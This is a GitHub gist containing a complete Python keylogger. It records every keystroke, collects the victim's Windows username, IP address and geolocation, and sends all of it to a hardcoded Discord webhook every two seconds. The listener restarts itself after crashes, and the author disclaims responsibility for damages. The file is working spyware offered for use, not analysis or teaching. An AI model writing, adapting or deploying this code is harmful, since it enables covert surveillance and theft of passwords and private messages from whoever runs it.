#date: 2025-06-02T16:41:54Z
#url: https://api.github.com/gists/210e8aa65b4a9abbc4618d810234515e
#owner: https://api.github.com/users/Sirage7474

# v1 Made By Sirage7474
# I am not responsible for any damages

webhook_url = "https://discord.com/api/webhooks/1379137891082571886/w8zmhX8AEm6sVKf0NG0VaZF6yksq3wubEK_tq7zy_XCflQOD1VcXCL91jNuy7gLaGx0w"

import os
import requests
import threading
from pynput import keyboard

country_phone_codes = {
    "AF": "+93", "AL": "+355", "DZ": "+213", "AR": "+54", "AU": "+61",
    "AT": "+43", "BD": "+880", "BE": "+32", "BG": "+359", "BR": "+55",
    "CA": "+1", "CH": "+41", "CL": "+56", "CN": "+86", "CO": "+57",
    "CZ": "+420", "DE": "+49", "DK": "+45", "EG": "+20", "ES": "+34",
    "FI": "+358", "FR": "+33", "GB": "+44", "GR": "+30", "HK": "+852",
    "HR": "+385", "HU": "+36", "ID": "+62", "IE": "+353", "IL": "+972",
    "IN": "+91", "IQ": "+964", "IR": "+98", "IT": "+39", "JP": "+81",
    "KR": "+82", "KZ": "+7", "LB": "+961", "LK": "+94", "LT": "+370",
    "LU": "+352", "LV": "+371", "MA": "+212", "MX": "+52", "MY": "+60",
    "NG": "+234", "NL": "+31", "NO": "+47", "NP": "+977", "NZ": "+64",
    "PE": "+51", "PH": "+63", "PK": "+92", "PL": "+48", "PT": "+351",
    "RO": "+40", "RU": "+7", "SA": "+966", "SE": "+46", "SG": "+65",
    "TH": "+66", "TR": "+90", "TW": "+886", "UA": "+380", "US": "+1",
    "VN": "+84", "ZA": "+27"
}


try:
    os.system("pip install pynput requests")
except:
    pass

text = ""
send_timer = None
lock = threading.Lock()

pressed_keys = set()

modifier_keys = {
    keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r,
    keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
}

def get_windows_username():
    return os.getenv('USERNAME') or "UnknownUser"

def send_ip_info():
    try:
        ip_info = requests.get("https://ipinfo.io/json").json()
        ip = ip_info.get("ip", "N/A")
        city = ip_info.get("city", "Unknown")
        country = ip_info.get("country", "Unknown")
        loc = ip_info.get("loc", "N/A")
        phone_code = country_phone_codes.get(country, "Unknown")
        user_name = get_windows_username()

        message = (
            "**User Is Connected!**\n\n"
            f"👤 **Windows User:** `{user_name}`\n"
            f"🌐 **IP:** `{ip}`\n"
            f"🏙️ **Location:** `{city}, {country}`\n"
            f"📍 **Coordinates:** `{loc}`\n"
            f"☎️ **Country Phone Code:** `{phone_code}`"
        )
        requests.post(webhook_url, json={"content": message})
    except Exception as e:
        requests.post(webhook_url, json={"content": f"❌ Failed to get IP info: {e}"})


def send_data():
    global text, send_timer
    with lock:
        if text.strip():
            try:
                embed = {
                    "title": "Key Logger",
                    "description": text,
                    "color": 0xFFFFFF
                }
                data = {"embeds": [embed]}
                response = requests.post(webhook_url, json=data)
                if response.status_code not in (200, 204):
                    print(f"❌ Discord response: {response.status_code} - {response.text}")
            except Exception as e:
                print(f"❌ Error sending data: {e}")
            text = ""
        send_timer = None


def schedule_send():
    global send_timer
    if send_timer and send_timer.is_alive():
        send_timer.cancel()
    send_timer = threading.Timer(2.0, send_data) 
    send_timer.start()

def format_key(key):
    if isinstance(key, keyboard.Key):
        if key == keyboard.Key.enter:
            return "[ENTER]"
        elif key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.tab:
            return "[TAB]"
        elif key == keyboard.Key.backspace:
            return "[BACKSPACE]"
        elif key == keyboard.Key.esc:
            return "[ESC]"
        else:
            name = str(key).replace('Key.', '').upper()
            return f"[{name}]"
    else:
        return str(key).strip("'")

def on_press(key):
    global text, pressed_keys
    try:
        with lock:
            pressed_keys.add(key)
            active_modifiers = {k for k in pressed_keys if k in modifier_keys}
            non_modifiers = {k for k in pressed_keys if k not in modifier_keys}

            if key not in modifier_keys:
                if active_modifiers:
                    parts = []
                    if keyboard.Key.ctrl_l in active_modifiers or keyboard.Key.ctrl_r in active_modifiers:
                        parts.append("Ctrl")
                    if keyboard.Key.shift_l in active_modifiers or keyboard.Key.shift_r in active_modifiers:
                        parts.append("Shift")
                    if keyboard.Key.alt_l in active_modifiers or keyboard.Key.alt_r in active_modifiers:
                        parts.append("Alt")
                    if keyboard.Key.cmd_l in active_modifiers or keyboard.Key.cmd_r in active_modifiers or keyboard.Key.cmd in active_modifiers:
                        parts.append("Win")
                    parts.append(format_key(key).strip("[]"))
                    combo_str = "+".join(parts)
                    text += f"[{combo_str}]"
                else:
                    text += format_key(key)
            else:
                pass

        schedule_send()

    except Exception as e:
        print(f"❌ Error in on_press: {e}")

def on_release(key):
    global pressed_keys
    try:
        if key in pressed_keys:
            pressed_keys.remove(key)
    except Exception as e:
        print(f"❌ Error in on_release: {e}")

def run_listener():
    while True:
        try:
            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        except Exception as e:
            print(f"❌ Listener crashed with error: {e}")
            import time
            time.sleep(1)

if __name__ == "__main__":
    send_ip_info()
    run_listener()